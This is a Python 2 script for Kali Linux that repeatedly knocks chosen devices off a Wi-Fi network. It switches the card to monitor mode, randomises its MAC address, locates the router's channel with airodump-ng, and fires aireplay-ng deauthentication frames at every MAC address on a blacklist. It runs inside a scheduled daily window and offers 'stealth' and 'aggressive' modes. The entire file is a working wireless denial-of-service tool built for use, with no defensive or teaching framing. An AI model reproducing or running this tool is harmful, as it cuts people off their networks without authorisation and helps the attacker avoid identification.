#!/usr/bin/env python
#
# Deauthenticates Clients From A Network
#
import os
import csv
import time
import argparse
import datetime
import subprocess
from threading import Thread
from platform import platform

class Engine(object):
 def __init__(self,mac,wlan,mode,s_hr,s_min,e_hr,e_min,desti='list-01.csv'):
  self.state = None # Off/On
  self.bssid = mac
  self.wlan  = wlan
  self.mode  = mode
  self.s_hr  = s_hr
  self.e_hr  = e_hr
  self.s_min = s_min
  self.e_min = e_min
  self.chan  = None
  self.csv   = desti
  self.run   = True
  self.alive = False
  self.delay = False
  self.dely  = 160 if mode == 'S' else 60
  self.n_s_h = '0{}'.format(self.s_hr) if len(str(self.s_hr))<2 else self.s_hr
  self.n_e_h = '0{}'.format(self.e_hr) if len(str(self.s_hr))<2 else self.e_hr
  self.n_s_m = '0{}'.format(self.s_min) if len(str(self.s_min))<2 else self.s_min
  self.n_e_m = '0{}'.format(self.e_min) if len(str(self.s_min))<2 else self.e_min
  self.s_hr  = int(s_hr)
  self.e_hr  = int(e_hr)
  self.s_min = int(s_min)
  self.e_min = int(e_min)

 def monitor(self):
  subprocess.Popen(['ifconfig',self.wlan,'down']).wait()
  subprocess.Popen(['iwconfig',self.wlan,'mode','monitor']).wait()
  subprocess.Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull).wait()
  subprocess.Popen(['ifconfig',self.wlan,'up']).wait()
  subprocess.Popen(['service','network-manager','stop']).wait()

 def managed(self):
  subprocess.Popen(['ifconfig',self.wlan,'down']).wait()
  subprocess.Popen(['iwconfig',self.wlan,'mode','managed']).wait()
  subprocess.Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull).wait()
  subprocess.Popen(['ifconfig',self.wlan,'up']).wait()
  subprocess.Popen(['service','network-manager','restart']).wait()
  time.sleep(2.56)

 def update(self):
  output='/tmp/output'
  devnull=open(output,'w+')
  cmd=['iw','dev',self.wlan,'set','channel',self.chan,'HT20']
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull).wait()
  subprocess.Popen(['pkill','airodump-ng']).wait()
  self.analyze(output)
  self.clean()

 def analyze(self,file):
  if from_file_to_list(file,mac=0):
   self.monitor()
   time.sleep(.4)
   self.update()

 def obtainInfo(self):
  subprocess.Popen(['pkill','airodump-ng']).wait()
  self.clean()
  cmd=['airodump-ng','--output-format','csv','-w','list',self.wlan]
  subprocess.Popen(cmd,stderr=Devnull,stdout=Devnull)

 def attack(self,client):
  cmd=['aireplay-ng','-0','1','-a',self.bssid,'-c',client,'--ignore-negative-one',self.wlan]
  subprocess.Popen(cmd,stdout=Devnull,stderr=Devnull).wait()

 def now(self):
  time=str(datetime.datetime.now()).split()[1][:5]
  return int(time[:2]),int(time[3:])

 def status(self,current):
  hrs,mins=current[0],current[1]
  if hrs==self.s_hr and mins==self.s_min:return True
  if hrs==self.e_hr and mins==self.e_min:return False

 def channels(self):
  try:
   with open(self.csv,'r') as AccessPoints:
    Data = csv.reader(AccessPoints,delimiter=',')
    for line in Data:
     if len(line) >= 10:
      chan  = str(line[3]).strip()
      bssid = str(line[0]).strip()
      if bssid==self.bssid:
       return chan
  except:self.obtainInfo()

 def clean(self):
  for item in os.listdir('.'):
   if os.path.isfile('/tmp/{}'.format(item)):
    os.remove(item)

 def kill(self):
  subprocess.Popen(['pkill','airodump-ng']).wait()
  subprocess.Popen(['pkill','aireplay-ng']).wait()
  self.state=False
  self.alive=False
  self.delay=False
  [self.managed() for i in range(2)]
  self.clean()
  self.run=False

def from_file_to_list(file,mac=1):
 list=[]
 if not os.path.exists(file):
  subprocess.call(['clear'])
  exit('[!] Unable to locate: {}'.format(file))

 with open(file,'r') as _file:
  for item in _file:
   if ':' in item:
    new_item=item.strip()
    new_item.replace('\n','')
    list.append(new_item)

 if not len(list) and mac:
  subprocess.call(['clear'])
  exit('[!] Unable to find mac addresses in: {}'.format(file))
 return list

def main():
 # Assign Arugments
 UserArgs = argparse.ArgumentParser()
 UserArgs.add_argument('interface', help='wireless interface')
 UserArgs.add_argument('mac',       help='bssid of router')
 UserArgs.add_argument('mode',      help='[A]ggressive [S]tealth') # Aggressive: 15 sec; Stealth: 60 sec
 UserArgs.add_argument('blacklist', help='path to blacklist with mac addresses')
 UserArgs.add_argument('start',     help='time to start attack each day; Military Time; Enter 15:07')
 UserArgs.add_argument('end',       help='time to stop  attack each day; Military Time; Enter 17:15')
 Args=UserArgs.parse_args()

 # Assign Variables
 list  = Args.blacklist if Args.blacklist else Args.blacklist
 mode  = Args.mode[0].upper() if Args.mode else Args.mode
 mode  = 'S' if mode != 'A' and mode != 'S' else mode
 blist = from_file_to_list(list)
 wlan  = Args.interface
 macs  = Args.mac
 mode  = mode[0]
 mem   = [[],[]]
 #
 blist=[mac for mac in blist]
 s_hr,s_min,e_hr,e_min=Args.start[:2],Args.start[3:],Args.end[:2],Args.end[3:]
 engine=Engine(macs,wlan,mode,s_hr,s_min,e_hr,e_min)

 # Enable Monitor Mode
 engine.monitor()

 # Change Directory
 os.chdir('/tmp')

 # Loading
 def load():
  while engine.run:
   for l in ['','.','..','...']:
    subprocess.call(['clear'])
    print '[-] Exiting {}'.format(l)
    time.sleep(0.155)   

 # Updates
 def updates():
  if engine.alive:
   engine.obtainInfo()
   time.sleep(5)
   subprocess.Popen(['pkill','airodump-ng']).wait()
   chan=str(engine.channels())
   if chan:engine.chan=chan
   else:print '[!] Unable to locate: {}'.format(engine.bssid)

 # Keeps An Eye On The Time While Main Process Is Busy
 def check():
  while engine.delay:
   n=engine.now()
   hrs,mins=n[0],n[1]

   if not int(mins) in mem[1]:
    mem[0].append(int(hrs));mem[1].append(int(mins))

   for a,alpha in enumerate(mem[0]):
    for b,beta in enumerate(mem[1]):
     if a!=b:continue

     if alpha == engine.e_hr and beta == engine.e_min:
      subprocess.Popen(['pkill','airodump-ng']).wait()
      engine.state=False
      engine.alive=False
      engine.delay=False
      engine.clean()

 # Start Process
 while engine.run:
  try:
   # Mode Changer
   engine.state=engine.status(engine.now())

   # When It's Not Off Or On
   if engine.state==None:msg=True if engine.alive else False

   # When It's On; Display
   if engine.state:
    subprocess.call(['clear'])
    print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,engine.n_e_h,engine.n_e_m)

   #  When It's Off; Display
   elif engine.state==False:
    subprocess.call(['clear'])
    engine.state=False
    engine.delay=False
    engine.alive=False
    subprocess.Popen(['pkill','airodump-ng']).wait()
    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,engine.n_s_h,engine.n_s_m)

   # When It's Not Off Or On
   else:
    # Messages To Display; It Depends On If It's Off Or Neutral
    if engine.alive:
     subprocess.call(['clear'])
     print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(msg,engine.n_e_h,engine.n_e_m)
    else:
     subprocess.call(['clear'])
     print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,engine.n_s_h,engine.n_s_m)

   # When It's On; Do This
   if engine.state:
    if not engine.alive:
     engine.alive=True
     del mem[0][:];del mem[1][:]

   # When It's Off; Do This
   if engine.state==False:
    if engine.alive:subprocess.Popen(['pkill','airodump-ng']).wait();engine.clean();engine.alive=False

   # Smart Delay
   def delay():
    for n in range(engine.dely):
     time.sleep(1)
     if not engine.alive:
      break

   # Attack Function
   def attack(client):
    engine.attack(client)

   # When Alive; Do This
   if engine.alive:
    engine.delay=True
    Thread(target=check).start()
    updates()
    engine.update()

    # Disconnect Clients From The Blacklist
    for client in blist:
     bot=Thread(target=attack,args=[client])
     bot.start()

    # Did We Disconnect Clients? If Yes, Then Wait, There Still Might Be Client Being Disconnecting
    if len(blist):
     while bot.is_alive() and engine.alive:pass

    # Pause
    delay()

    # Kills The Time Keeping Thread
    engine.delay=False

   # Try & Reduce Flicker Of Screen
   time.sleep(.4)

   # Flush List That Holds Time
   del mem[0][:];del mem[1][:]
  except KeyboardInterrupt:
   #subprocess.call(['clear'])
   #print '[-] Exiting ...'
   Thread(target=load).start()
   engine.kill() 

if __name__ == '__main__':
 # Filters
 if not 'kali' in platform():
  exit('[-] Kali Linux 2.0 Required!')

 # Root?
 if os.getuid():
  exit('[-] Root Access Required!')

 # Suppress Output
 Devnull = open(os.devnull,'w')

 # Start
 main()
